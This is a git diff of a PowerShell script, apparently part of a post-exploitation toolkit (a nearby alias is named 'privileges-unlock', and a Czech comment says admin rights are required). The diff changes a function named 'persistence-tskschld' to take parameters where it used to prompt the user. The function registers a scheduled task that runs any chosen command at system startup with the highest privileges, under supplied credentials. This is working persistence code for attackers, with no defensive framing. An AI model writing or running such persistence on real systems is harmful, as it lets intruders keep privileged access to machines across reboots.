@@ -201,14 +201,17 @@ Set-Alias -Name privileges-unlock -Value privileges-unlock
 
 # musis byt admin !
 function persistence-tskschld {
-write-host "file or command for persistence: " -NoNewline -ForegroundColor DarkGreen
-$Request = read-host
-write-host "enter name of tskschld: " -NoNewline -ForegroundColor Cyan
-$tname = read-host
-write-host "enter user: " -NoNewline -ForegroundColor Red
-$user = read-host
-write-host "enter password: " -NoNewline -ForegroundColor Red
-$pass = read-host
+    param(
+		[string]$processName,
+		[string]$processTarget,
+		[string]$processUsername,
+		[string]$processPassword
+    )
+    $Request =  $processName
+    $tname =  $processTarget
+    $user = $processUsername
+    $pass = $processPassword
+
 $action = New-ScheduledTaskAction -Execute "$Request"
 $trigger = New-ScheduledTaskTrigger -AtStartup
 Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "$tname" -User "$user" -Password "$pass" -RunLevel Highest
